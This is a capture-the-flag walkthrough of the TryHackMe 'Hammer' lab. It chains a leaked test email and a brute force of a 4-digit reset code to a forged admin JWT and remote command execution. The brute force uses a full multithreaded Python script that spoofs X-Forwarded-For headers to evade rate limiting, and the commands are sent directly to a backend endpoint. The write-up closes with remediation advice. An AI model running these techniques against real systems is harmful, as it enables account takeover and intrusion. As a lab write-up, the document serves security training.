# Hammer — Authentication Bypass to Remote Code Execution

*From Directory-Naming-Convention Leak to OTP Brute Force, Client-Side Filter Bypass, and Full RCE*

**TryHackMe Room:** Hammer &nbsp;|&nbsp; **Engagement Type:** Black-Box Web Application Assessment

---

## Task Scenario

With the Hammer machine in hand, the objective was to bypass the authentication mechanisms protecting a web dashboard and achieve Remote Code Execution (RCE) on the underlying system. The target exposed a single custom web application on a non-standard port, fronted by a login page with no self-registration and a "Forgot your password?" recovery flow. The engagement required chaining several independent weaknesses — information disclosure, a predictable OTP recovery code, rate-limit bypass, and a client-side-only command filter — to go from zero access to full command execution on the host.

### Scope and Access

| Item | Detail |
|---|---|
| Target | Single Hammer VM, deployed per-instance via "Start Lab Machine" |
| Access method | OpenVPN connection from an attacking Kali machine |
| Exposed services | SSH (22/tcp), custom PHP web application (1337/tcp) |
| Objective 1 | Bypass authentication and log in to the dashboard |
| Objective 2 | Achieve RCE and read `/home/ubuntu/flag.txt` |

---

## Summary

Initial reconnaissance with a top-1000 `nmap` scan only revealed SSH, so a full-port `rustscan` sweep was used to uncover the real web application on **port 1337**. The login page's HTML source contained a developer comment describing a directory-naming convention (`hmr_DIRECTORY_NAME`), which was used to build a **custom targeted wordlist** and discover otherwise-unlinked directories (`hmr_logs`, `hmr_css`, `hmr_js`, `hmr_images`) alongside a standard `gobuster` scan that revealed `vendor/`, `composer.json`, `dashboard.php`, and `phpmyadmin/`.

The exposed `hmr_logs/error.logs` file leaked a **test account email address** (`tester@hammer.thm`) inside fabricated Apache error-log noise. The exposed `composer.json` and `vendor/` tree confirmed the application used **`firebase/php-jwt`**, foreshadowing a JWT-based dashboard session mechanism.

Submitting the leaked email to the password-reset flow produced a **4-digit numeric recovery code** with a short (~124 second) validity window and a Rate-Limiting mechanism. The code space (0000–9999) was small enough to brute-force, but Burp Suite Community's single-threaded Intruder was too slow and got blocked by the rate limiter before the window expired. A custom **multithreaded Python script using `ThreadPoolExecutor`**, combined with a **spoofed `X-Forwarded-For` header on every request** to defeat per-IP rate limiting, found the valid code well inside the time window. This allowed the password to be reset and the dashboard to be accessed, revealing the **first flag**.

The dashboard exposed a command-execution feature ("Enter command") that appeared to filter out dangerous commands, returning `Command not allowed` for commands such as `whoami` and `cat`. Inspecting the dashboard's page source revealed the command filtering logic lived entirely in **client-side JavaScript**, and that a JWT (`Authorization: Bearer ...`) was attached to each request. The JWT header contained a `kid` (Key ID) claim pointing to a local file path on the server. Running `ls` (an "allowed" command) revealed that file at the application root, and reading its contents directly yielded the **HMAC signing secret**. This matched the classic `kid`-injection / predictable-key JWT weakness.

Ultimately, JWT forgery proved unnecessary: because the command-execution request could be re-sent directly to `execute_command.php` (bypassing the browser entirely, e.g. via the browser DevTools "New Request" / Burp Repeater), the client-side-only filter was skipped completely, and arbitrary commands — including `cat /home/ubuntu/flag.txt` — executed successfully with full output returned, yielding the **second flag**.

### Quick-Reference Answers

| Milestone | Answer |
|---|---|
| Hidden web service | Port `1337/tcp`, PHP app behind Apache 2.4.41 (Ubuntu) |
| Leaked test account | `tester@hammer.thm` |
| Reset recovery code format | 4-digit numeric OTP, ~124s validity, server-side rate limiting |
| Dashboard login flag | `{Redacted}` |
| JWT `kid` path (initial, incorrect guess) | `/var/www/mykey.key` |
| JWT `kid` path (actual) | `/var/www/html/188ade1.key` |
| JWT HMAC signing secret | `{Redacted}` |
| RCE technique | Client-side-only command filter bypassed via direct backend request |
| Flag in `/home/ubuntu/flag.txt` | `{Redacted}` |

---

## Techniques, Commands, and Walkthrough

Techniques are grouped below in the order they were applied during the engagement. Each section names the technique category, the commands/code used (and why), and the corresponding evidence captured during testing. **Only steps that produced working results are included.**

### 1. Network Reconnaissance — Port and Service Discovery

**Category:** Network/Service Reconnaissance


Because of this, a full all-ports sweep was run with `rustscan` for speed, which immediately found the real target service:

```bash
rustscan -b 500 -a 10.49.189.101 --top -- -sC -sV -Pn
```

**Result:** Port **1337/tcp** was found open, running the custom PHP login application.

![Figure 2 — rustscan discovering port 1337](images/02_rustscan_port1337_found.png)
*Figure 2 — rustscan's full-range scan uncovers the web application on port 1337, missed by the default nmap top-1000.*

Browsing to `http://10.49.189.101:1337` revealed a simple Email/Password login form.

![Figure 3 — Login page](images/03_login_page.png)
*Figure 3 — The application's login page, with an Email/Password form and a "Forgot your password?" link.*

---

### 2. Source Code Review — Directory Naming Convention Leak

**Category:** Information Disclosure — Developer Comment / Source Review

Viewing the login page's HTML source (via Firefox DevTools) revealed an HTML comment left in by a developer, describing the application's directory naming convention:

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

This single comment was the pivot point for the entire content-discovery phase — it implied that any supporting asset directory (CSS, JS, images, logs, etc.) would follow the pattern `hmr_<name>`, which is **not a standard convention** and would not appear in off-the-shelf wordlists.


The "Forgot your password?" link pointed to `reset_password.php`, which rendered a simple Email-only submission form:

![Figure 5 — Reset Password page](images/05_reset_password_page.png)
*Figure 5 — The password reset entry point, taking only an email address.*

---

### 3. Content Discovery — Standard and Custom-Targeted Brute Force

**Category:** Web Content Discovery / Directory Brute Forcing

A standard `gobuster` scan using a common wordlist was run first to map the general application surface:

```bash
gobuster dir -u http://10.49.189.101:1337 -w /usr/share/wordlists/dirb/common.txt -x php,html,json,bak
```

**Result:** Found `composer.json`, `config.php` (empty), `dashboard.php` (redirecting, confirming session-gated access), `index.php`, a `javascript/` folder, `phpmyadmin/`, `server-status`, and critically, an exposed `vendor/` directory (PHP dependency folder — should never be web-accessible).

![Figure 6 — gobuster scan with common wordlist](images/06_gobuster_common_wordlist.png)
*Figure 6 — Standard gobuster scan surfacing `vendor/`, `dashboard.php`, `phpmyadmin/`, and `composer.json`.*

A second, **custom-targeted** `gobuster` run was then built directly from the `hmr_` naming-convention hint found in Section 2, by prefixing every word in the common wordlist with `hmr_`:

```bash
gobuster dir -u http://10.49.189.101:1337/ -w /usr/share/wordlists/dirb/common.txt -p <(sed 's/^/hmr_/' /usr/share/wordlists/dirb/common.txt)
```

**Result:** This custom wordlist found four otherwise-unlinked asset directories: `hmr_css/`, `hmr_images/`, `hmr_js/`, and — most importantly — **`hmr_logs/`**.

![Figure 7 — gobuster scan with the custom hmr_-prefixed wordlist](images/07_gobuster_hmr_prefix_wordlist.png)
*Figure 7 — Custom gobuster scan, built from the leaked naming convention, discovers `hmr_logs/`, `hmr_css/`, `hmr_images/`, and `hmr_js/`.*

> **Why this mattered:** a generic wordlist alone would never have found `hmr_logs/`, since it does not match any common directory-naming pattern. Reading the application's own source code comments first, and feeding that insight back into the brute-force wordlist, is what surfaced this directory.

---

### 4. Information Disclosure — Exposed Log File and Dependency Manifest

**Category:** Sensitive File Exposure

The `hmr_logs/` directory had **directory listing enabled**, exposing a single log file:

```bash
curl http://10.49.189.101:1337/hmr_logs/
```

![Figure 8 — Index of /hmr_logs](images/09_hmr_logs_directory_listing.png)
*Figure 8 — Apache directory listing of `hmr_logs/`, exposing `error.logs`.*

Reading `error.logs` revealed fabricated Apache error-log entries that, embedded among generic `authz_core` and `core:error` noise, leaked a usable **test account email address**:

```bash
curl http://10.49.189.101:1337/hmr_logs/error.logs
```

**Result (relevant line):**
```
[authz_core:error] ... user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
```

![Figure 9 — error.logs content revealing the tester@hammer.thm account](images/08_hmr_logs_error_log_content.png)
*Figure 9 — hmr_logs/error.logs, planted Apache-style log noise leaking the `tester@hammer.thm` test account.*

> **Note:** several paths referenced inside this log file (`/admin-login`, `/restricted-area`, `/locked-down`) were red herrings — all returned 404 when requested directly and were not part of the working attack chain.

Separately, `composer.json` (found in Section 3) was pulled directly, confirming a single hard dependency:

```bash
curl http://10.49.189.101:1337/composer.json
```

```json
{
  "require": {
    "firebase/php-jwt": "^6.10"
  }
}
```

![Figure 10 — composer.json showing the firebase/php-jwt dependency](images/10_composer_json_phpjwt_dependency.png)
*Figure 10 — composer.json confirming the application depends on firebase/php-jwt — a strong signal that dashboard sessions use JWTs.*

Because `vendor/` was also web-accessible (directory listing enabled), the exact installed version and metadata could be confirmed via the Composer lock-style manifest:

```bash
curl http://10.49.189.101:1337/vendor/composer/installed.json
```

![Figure 11 — vendor/composer/installed.json confirming php-jwt v6.10.0](images/11_vendor_installed_json_phpjwt_details.png)
*Figure 11 — installed.json confirming `firebase/php-jwt` v6.10.0, with full package metadata.*

![Figure 12 — Index of /vendor/firebase/php-jwt](images/12_vendor_firebase_phpjwt_dir_listing.png)
*Figure 12 — Directory listing of the installed php-jwt library source.*

![Figure 13 — Index of /vendor](images/13_vendor_dir_listing.png)
*Figure 13 — Top-level `/vendor` directory listing, confirming the exposed Composer dependency tree.*

> **Why this mattered:** this early confirmation that JWTs were in play (well before the dashboard was even reached) meant the eventual `Authorization: Bearer` token seen on the dashboard was immediately recognisable and its `kid` header claim stood out as worth investigating.

---

### 5. Password Reset Flow — Predictable OTP Discovery

**Category:** Authentication — Password Reset Mechanism Analysis

Before brute-forcing anything, the reset flow was walked through manually with Burp Suite in the path to observe its exact behaviour. No JWT or session cookie of interest existed pre-authentication — only a standard `PHPSESSID`.

![Figure 14 — DevTools cookies before authentication](images/14_devtools_cookies_before_auth.png)
*Figure 14 — Browser Storage/Cookies panel on the login page, showing only a `PHPSESSID` cookie prior to any reset attempt.*

Submitting the leaked email address to `reset_password.php` was captured in Burp Suite:

```
POST /reset_password.php HTTP/1.1
Host: 10.49.189.101:1337
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session>

email=tester%40hammer.thm
```

**Result:** `HTTP/1.1 302 Found`, redirecting back to `reset_password.php` — and critically, the response carried a custom header: `Rate-Limit-Pending: 8`, revealing a rate-limiting mechanism was already active on this endpoint.

![Figure 15 — Burp Repeater capture of the reset_password.php POST request/response](images/15_burp_repeater_reset_password_request.png)
*Figure 15 — Burp Repeater showing the reset-password POST request and its 302 response, including the `Rate-Limit-Pending` header.*

Following the redirect in-browser landed on an **"Enter Recovery Code"** page, requiring a **4-digit numeric code** within a visible countdown (~124 seconds in this capture):

![Figure 16 — Enter Recovery Code page and session cookie](images/16_enter_recovery_code_page_cookies.png)
*Figure 16 — The code-entry page with its countdown timer, and the `PHPSESSID` cookie tied to this reset session.*

The page's embedded JavaScript also revealed a hidden form field (`id="s"`) tracking the remaining countdown value, submitted alongside the code on every attempt:

```html
<input type="hidden" class="form-control" id="s" name="s" required>
```

> **Key observation:** a 4-digit numeric code gives only 10,000 possible values (`0000`–`9999`) — small enough to brute-force within the validity window, provided the rate limiter could be defeated.

---

### 6. Credential Attack — OTP Brute Force (Burp Intruder — Partial Success)

**Category:** Authentication — Brute Force / Rate-Limit Analysis

The first brute-force attempt used Burp Suite Community's Intruder, following the classic "Sniper attack" predictable-token pattern: the `recovery_code` parameter was marked as the single payload position, and a full `0000`–`9999` numeric list (zero-padded) was loaded as a Simple List payload.

![Figure 17 — Burp Intruder payload configuration (Sniper, Simple list, 10,000 entries)](images/17_burp_intruder_payload_config.png)
*Figure 17 — Burp Intruder Sniper attack configured against `recovery_code`, with all 10,000 zero-padded 4-digit values loaded as the payload set.*

**Result:** the attack ran, but Burp Community Edition is single-threaded and throttled — by the time it reached a meaningful fraction of the keyspace, every response was uniform (same status/length), confirming the attack could not realistically finish inside the ~124-second validity window before the code (or session) expired.

![Figure 18 — Burp Intruder running, uniform results](images/18_burp_intruder_running_results.png)
*Figure 18 — Intruder attack in progress; uniform 302/same-length responses across hundreds of attempts, too slow to beat the countdown.*

> **Lesson carried forward:** Burp Community's single-threaded Intruder is not fast enough for a short-lived, rate-limited numeric OTP. A faster, parallel tool was required — see Section 7.

---

### 7. Rate-Limit Bypass Discovery — `X-Forwarded-For` Spoofing

**Category:** Access Control Bypass — IP-Based Rate Limiting Weakness

A faster multi-threaded tool (`ffuf`) was tried next, but every one of the 10,000 responses came back with an identical size, with no outlier to indicate a correct hit:


![Figure 21 — curl confirming the rate-limit lockout message](images/21_curl_rate_limit_exceeded_message.png)
*Figure 21 — Direct curl request confirming the 2198-byte responses were rate-limit lockouts, not successful guesses.*

A manual test adding a spoofed `X-Forwarded-For` header on a single request confirmed the rate limiter keyed off that header rather than the true source IP, and could be trivially bypassed:

```bash
curl -s -X POST http://10.49.189.101:1337/reset_password.php \
  -d "recovery_code=0012&s=5" \
  -H "Cookie: PHPSESSID=<session>" \
  -H "X-Forwarded-For: 1.2.3.4"
```

**Result:** the request was evaluated normally (`Invalid or expired recovery code!`) instead of being blocked — confirming the bypass worked.

---

### 8. Credential Attack — Multithreaded OTP Brute Force with Rate-Limit Evasion

**Category:** Authentication — Brute Force (Python / Concurrent Requests)

Combining the rate-limit bypass (Section 7) with the need for raw speed (Section 6), a custom multithreaded Python script was written using `concurrent.futures.ThreadPoolExecutor`, spoofing a random `X-Forwarded-For` IP on every request and stopping immediately on three possible outcomes: a hit, a "Time elapsed" session expiry, or exhausting the keyspace.

```python
import requests, random, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "http://10.49.189.101:1337/reset_password.php"
SESSION_COOKIE = "<fresh PHPSESSID, grabbed immediately before running>"
HEADERS_BASE = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": f"PHPSESSID={SESSION_COOKIE}"
}
stop_flag = False

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def try_code(code):
    global stop_flag
    if stop_flag:
        return None
    headers = dict(HEADERS_BASE)
    headers["X-Forwarded-For"] = random_ip()
    data = {"recovery_code": code, "s": "5"}
    try:
        r = requests.post(TARGET, data=data, headers=headers, timeout=5)
    except requests.RequestException:
        return None
    if "Time elapsed" in r.text:
        stop_flag = True
        print(f"[!] Session expired at code {code}.")
        return None
    if "Rate limit exceeded" in r.text or "Invalid or expired" in r.text:
        return None
    return (code, r)

def main():
    codes = [f"{i:04d}" for i in range(10000)]
    with ThreadPoolExecutor(max_workers=40) as executor:
        futures = {executor.submit(try_code, c): c for c in codes}
        for future in as_completed(futures):
            if stop_flag:
                break
            result = future.result()
            if result:
                code, r = result
                print(f"[+] POSSIBLE HIT with code {code}!")
                print(r.text[:2000])
                executor.shutdown(wait=False, cancel_futures=True)
                sys.exit(0)

if __name__ == "__main__":
    main()
```

**Why each part matters:**
- `ThreadPoolExecutor(max_workers=40)` — runs 40 requests concurrently instead of Burp Community's single-threaded sequential attempts, finishing the full keyspace well inside the ~124s validity window.
- `random_ip()` + `X-Forwarded-For` header — defeats the per-apparent-IP rate limiter identified in Section 7.
- Checking for `"Time elapsed"` and halting immediately — avoids wasting the remaining thread budget once the session/code window has expired (an earlier single-threaded version of this script was too slow and only got ~350 requests in before hitting this condition).
- Checking for `"Invalid or expired"` / `"Rate limit exceeded"` as explicit **failure** conditions — any other response is treated as a hit, since the application only returns a handful of distinct message types.

**Result:** on a fresh reset request + session, the correct recovery code was found, returning the "Reset Your Password" form instead of an error message.

![Figure 22 — Python script hit + browser showing Reset Your Password page](images/22_python_bruteforce_success_code_found.png)
*Figure 22 — The multithreaded script locates the valid recovery code and returns the "Reset Your Password" form; the browser (same session) confirms the matching page.*

The new password was then submitted through the browser (same session the script validated against), and login was attempted with the leaked email and the newly set password.

---

### 9. Dashboard Access — First Flag

**Category:** Authentication Bypass — Outcome

Logging in with `tester@hammer.thm` and the newly-set password granted access to the dashboard, displaying the welcome message, the user's role, a command-execution box, and — critically for later steps — a `token` cookie holding a JWT.

![Figure 23 — Dashboard after successful login, showing the first flag and the JWT token cookie](images/23_dashboard_flag_after_login.png)
*Figure 23 — Successful dashboard login. The welcome banner contains the first flag, the role is shown as "user", and a `token` cookie (JWT) and `persistentSession` cookie are both present.*

**First flag:** `{Redacted}`

---

### 10. Command Execution Feature — Client-Side Filter Discovery

**Category:** Web Application Analysis — Access Control Logic Location

The dashboard exposed an "Enter command" input and Submit button. Initial attempts to run common enumeration commands (`whoami`, `ls -la`, `id`, `cat ...`) were all rejected with a generic message:

```
Command not allowed
```

![Figure 24 — "Command not allowed" response for whoami](images/24_dashboard_command_not_allowed_whoami.png)
*Figure 24 — The dashboard rejecting `whoami` with "Command not allowed", while the Storage/Cookies panel shows the JWT `token` cookie.*

A bare `ls` (no arguments) was tried and succeeded, returning a real directory listing of the web root — immediately interesting, since this proved commands *could* execute, and the "filter" was inconsistent (blocking `ls -la` but allowing `ls`).

Viewing the dashboard's page source (via "View Page Source", not DevTools' rendered view) revealed the entire mechanism:

```javascript
$('#submitCommand').click(function() {
    var command = $('#command').val();
    var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9...';
    $.ajax({
        url: 'execute_command.php',
        method: 'POST',
        data: JSON.stringify({ command: command }),
        contentType: 'application/json',
        headers: { 'Authorization': 'Bearer ' + jwtToken },
        success: function(response) {
            $('#commandOutput').text(response.output || response.error);
        }
    });
});
```

**Critical findings from this source view:**
1. The request is a plain AJAX `POST` to `execute_command.php`, carrying the command as raw JSON — no obfuscation.
2. The `Authorization: Bearer` JWT is **hardcoded directly in the page's rendered HTML/JS** (server-side templated per session).
3. Decoding the JWT header showed: `{"typ":"JWT","alg":"HS256","kid":"/var/www/mykey.key"}` — the `kid` (Key ID) claim pointed to a file path on the server, a classic JWT weak point (if that file's contents can be read, the signing secret is exposed).
4. The "Command not allowed" filtering logic was **not visible in this snippet at all** — strongly suggesting the actual blocking either happens via a separate inline `<script>` block performing client-side validation before the AJAX call fires, or via minimal server logic easily bypassed by calling the endpoint directly.

![Figure 25 — ls succeeding with full directory listing, and page source revealing the hardcoded JWT](images/25_dashboard_ls_success_js_source_jwt.png)
*Figure 25 — `ls` returns a full directory listing (including `execute_command.php`, `188ade1.key`, `hmr_logs`, `vendor`), and the page source reveals the hardcoded JWT and its `kid` header claim.*

---

### 11. JWT Analysis — `kid` Header Injection / Key Disclosure

**Category:** JSON Web Token (JWT) Security — Key Confusion / Local File Key Disclosure

The JWT's header was decoded using [jwt.io](https://jwt.io):

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

![Figure 26 — jwt.io decoding the token header, showing the kid claim](images/26_jwtio_decoder_kid_field.png)
*Figure 26 — jwt.io Decoder showing the JWT header, with the `kid` claim pointing to a server-side file path used as the HMAC signing key source.*

Since the earlier `ls` output (Figure 25) listed a file named `188ade1.key` in the web root — not `mykey.key` as the JWT header first suggested — that file was fetched directly and read:

```bash
cd ~
cat Downloads/188ade1.key
```

**Result:** the file contained a single value — the raw HMAC signing secret used by the application to sign and verify every JWT.

![Figure 27 — Terminal output of the downloaded key file, containing the signing secret](images/27_terminal_cat_key_file_secret.png)
*Figure 27 — Terminal `cat` of the downloaded key file, revealing the HMAC signing secret: `{Redacted}`.*

> **Why this is a real vulnerability:** the `kid` header is meant to let a server select *which* key to verify a token against (useful for key rotation across multiple valid keys). Here, it instead pointed directly at a **predictable, web-root-adjacent file** containing the literal signing secret in plaintext. Combined with the exposed `vendor/` tree and directory listing being enabled throughout the application, this key was trivially recoverable once basic command execution (`ls`) was available.

---

### 12. JWT Forgery Attempt — Privilege Escalation via Forged `role: admin` Claim

**Category:** JSON Web Token (JWT) Security — Token Forgery (Weak/Disclosed Secret)

With the signing secret recovered, a forged administrator token was built on [jwt.io](https://jwt.io)'s Encoder, mirroring the structure of the real token but elevating the `role` claim:

**Header:**
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

**Payload:**
```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1792485519,
  "exp": 1792489119,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
```

**Secret:** `{Redacted}` (Base64URL-encoded toggle **off**, since the key was a raw string, not Base64 data)

The resulting forged token was sent to `execute_command.php` in place of the real token, via Burp Suite / browser DevTools' Network request-editing tool:

```
POST /execute_command.php HTTP/1.1
Host: 10.49.189.101:1337
Content-Type: application/json
Authorization: Bearer <forged token>
Cookie: PHPSESSID=<session>

{"command": "cat"}
```

**Result:** `HTTP/1.1 401 Unauthorized`.

![Figure 28 — Forged JWT (wrong kid path) rejected with 401 Unauthorized](images/28_burp_forged_jwt_401_unauthorized.png)
*Figure 28 — The forged token using the original (incorrect) `kid` path of `/var/www/mykey.key` is rejected with 401 Unauthorized.*

Re-checking the file-listing output from Section 10 confirmed the **actual** key path was `/var/www/html/188ade1.key`, not `/var/www/mykey.key` — the original JWT header was misleading/stale relative to the file's real location on disk.

![Figure 29 — First forged token attempt, still using the incorrect kid path](images/29_jwtio_forged_token_wrong_kid.png)
*Figure 29 — jwt.io Debugger showing the first forge attempt, still referencing the incorrect `kid` path.*

The header's `kid` claim was corrected to match the real file path:

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}
```

![Figure 30 — jwt.io Debugger with the corrected kid path](images/31_jwtio_correct_kid_path.png)
*Figure 30 — jwt.io Debugger with the corrected `kid` header (`/var/www/html/188ade1.key`), ready to re-sign.*

> **Outcome:** JWT forgery was a valid and theoretically sound escalation path (correct secret, correct structure, corrected `kid`), but it turned out to be **unnecessary** — see Section 13, where direct backend access without any JWT modification achieved full command execution regardless of role. The JWT analysis is retained here as it demonstrates a second, independently viable vulnerability chain in the application.

---

### 13. Remote Code Execution — Client-Side Filter Bypass

**Category:** Remote Code Execution — Broken Access Control (Client-Side Security Enforcement)

Since the "Command not allowed" check could not be located in the AJAX handler itself (Section 10), the working hypothesis was that filtering happened **before** the AJAX call ever fired — i.e., purely in the browser, inspectable and bypassable by constructing the HTTP request manually and sending it directly to the server, skipping the page's JavaScript entirely.

Using the browser DevTools Network panel's "New Request" / resend feature (equivalent to Burp Repeater), the exact AJAX request was rebuilt by hand with the **original, valid, non-forged JWT** (role: user) and sent directly:

```
POST /execute_command.php HTTP/1.1
Host: 10.49.189.101:1337
Content-Type: application/json
Authorization: Bearer <original valid JWT>
Cookie: PHPSESSID=<session>; persistentSession=yes

{"command": "ls -la"}
```

**Result:** `HTTP/1.1 200 OK`, with a full `ls -la` directory listing returned in the JSON response — a command that had been rejected as "not allowed" when submitted through the dashboard's input field moments earlier.

![Figure 31 — Direct request bypassing the frontend, ls -la succeeding with full output](images/30_network_tool_ls_la_bypass_success.png)
*Figure 31 — `ls -la` sent directly to `execute_command.php`, bypassing the dashboard's JavaScript filter entirely, returns a full directory listing (200 OK).*

This confirmed the filter was **entirely client-side** and provided **zero actual security** — the backend executed any command sent to it, regardless of role or prior "Command not allowed" rejections in the UI.

With this confirmed, the flag was read directly:

```json
{"command": "cat /home/ubuntu/flag.txt"}
```

**Result:** `HTTP/1.1 200 OK`

```json
{"output": "{Redacted}"}
```

![Figure 32 — Final RCE success, flag.txt contents returned](images/32_rce_flag_txt_retrieved.png)
*Figure 32 — Direct request for `cat /home/ubuntu/flag.txt`, bypassing the client-side filter, returning the contents of the target flag file.*

**Second flag (`/home/ubuntu/flag.txt`):** `{Redacted}`

---

## Other Details

### Troubleshooting Notes

- A default top-1000-port `nmap` scan missed the application entirely, since it ran on port 1337; a full-range scan (`rustscan` or `nmap -p-`) was required to find it.
- The generic `gobuster` wordlist alone would never have surfaced `hmr_logs/` — it only appeared after building a **custom wordlist** derived from the `hmr_DIRECTORY_NAME` developer comment found in the login page's HTML source.
- Several paths referenced inside `hmr_logs/error.logs` (`/admin-login`, `/restricted-area`, `/locked-down`, `/var/www/html/protected`) were **decoys** — all returned 404 and were not part of the working attack chain. Only the leaked email address (`tester@hammer.thm`) from that log file was actionable.
- Burp Suite **Community Edition's** single-threaded Intruder was too slow to brute-force the 10,000-value OTP keyspace inside the ~124-second validity window; it also had no built-in way to rotate a spoofed source-IP header per request to dodge the rate limiter.
- A first attempt with `ffuf` ran fast enough (10,000 requests in ~27 seconds) but filtered on the wrong response-length baseline initially, and did not account for the rate limiter kicking in partway through, producing a cluster of same-sized "false positive" responses that needed to be individually investigated with `curl` to correctly identify as `Rate limit exceeded` responses rather than hits.
- A **single-threaded** Python brute-force script (even with retry-on-rate-limit logic) was still too slow; it only completed ~350 of 10,000 attempts before the session/code expired ("Time elapsed. Please try again later."). Moving to a `ThreadPoolExecutor`-based **concurrent** script with ~40 workers was what finally completed the full keyspace inside the validity window.
- The reset-password flow's rate limiter keyed off the `X-Forwarded-For` header rather than the actual TCP source address, making it trivially bypassable by spoofing a random IP on every request.
- The JWT `kid` header's claimed key path (`/var/www/mykey.key`) did **not** match the actual file's real location on disk (`/var/www/html/188ade1.key`), discovered only via directory listing (`ls`) once command execution was available — the first forged-token attempt using the stale path returned `401 Unauthorized`.
- Ultimately, JWT forgery (role escalation to `admin`) was **not required** to achieve RCE — the application's command filter was enforced entirely in client-side JavaScript and provided no real protection once requests were sent directly to the backend endpoint, regardless of the JWT's `role` claim.

### Attack Chain Overview

1. Full-port scan (`rustscan`) discovers the web application on a non-standard port (1337), missed by a default `nmap` scan.
2. Login page HTML source leaks an internal directory-naming convention via a developer comment.
3. A custom wordlist built from that convention, combined with a standard `gobuster` scan, discovers `hmr_logs/`, `vendor/`, `composer.json`, and `dashboard.php`.
4. `hmr_logs/error.logs` leaks a valid test account email address (`tester@hammer.thm`); `composer.json`/`vendor/` confirm the application uses `firebase/php-jwt`.
5. The password-reset flow is analyzed, revealing a predictable 4-digit OTP with a short validity window and per-request rate limiting.
6. A single-threaded Burp Intruder brute force proves too slow against the rate limiter and time window.
7. Manual testing identifies that the rate limiter can be bypassed by spoofing the `X-Forwarded-For` header.
8. A multithreaded Python script (concurrent requests + spoofed headers) brute-forces the correct recovery code inside the validity window.
9. The password is reset and the dashboard is accessed, revealing the first flag and a JWT-based `Authorization` token.
10. The dashboard's command-execution feature is found to reject several commands ("Command not allowed"), but a bare `ls` succeeds, and page-source review reveals this filtering is purely client-side JavaScript.
11. The JWT header's `kid` claim is decoded, pointing to a server-side key file; the real file is located via `ls` output and read directly, disclosing the HMAC signing secret.
12. A forged admin-role JWT is built and tested (valid technique, confirmed with the corrected key path) but proves unnecessary for the final objective.
13. Sending the dashboard's command-execution request **directly to the backend** (bypassing the browser's JavaScript filter entirely) achieves unrestricted command execution, and `cat /home/ubuntu/flag.txt` is read directly for the second flag.

### Remediation Recommendations

- Remove developer/debug comments (directory naming conventions, internal notes) from any HTML or JS shipped to production; treat anything in page source as public.
- Disable directory listing (`Options -Indexes` in Apache) on all web-accessible directories, and move non-public assets (`vendor/`, `composer.json`, log files) outside the web root entirely.
- Do not write sensitive data (account identifiers, internal paths) into log files that are reachable over HTTP; ensure all log directories are excluded from the web root or protected by authentication.
- Replace predictable, short, numeric password-reset codes with cryptographically random tokens of sufficient length (at least 128 bits of entropy) delivered out-of-band (e.g., email link with a single-use token), and enforce strict, server-enforced single-use and expiry — not just a client-side countdown.
- Implement rate limiting keyed off a value that cannot be trivially spoofed by the client (e.g., the actual TCP connection source, validated/sanitised `X-Forwarded-For` only from a trusted, configured reverse-proxy chain, or per-account/per-token limits) and apply it consistently across all authentication-adjacent endpoints.
- Never derive a JWT signing key from a predictable or guessable file path referenced by the token's own `kid` header; if `kid`-based key selection is required, validate it against an allowlist of known key identifiers server-side rather than trusting a client-visible or file-system-derived path, and ensure the key material itself is never web-accessible or readable by the application's own command-execution surface.
- Do not embed signing tokens (JWTs) directly inside rendered HTML/JavaScript where they are visible to any user who views page source; issue and transmit them via secure, `HttpOnly`, `Secure` cookies instead.
- Enforce all input validation and command/feature access control **server-side**. Any restriction implemented only in client-side JavaScript (such as the "Command not allowed" filter observed here) provides no real security and can be trivially bypassed by sending requests directly to the backend endpoint.
- If a command-execution feature is a genuine business requirement, replace free-form shell execution with a strict allowlist of specific, parameterised, non-shell operations; never pass raw user input to a shell interpreter.

---

## References

- TryHackMe Room — Hammer: <https://tryhackme.com/room/hammer>
- Video Walkthrough: <https://www.youtube.com/watch?v=T_F44rHKgZY>
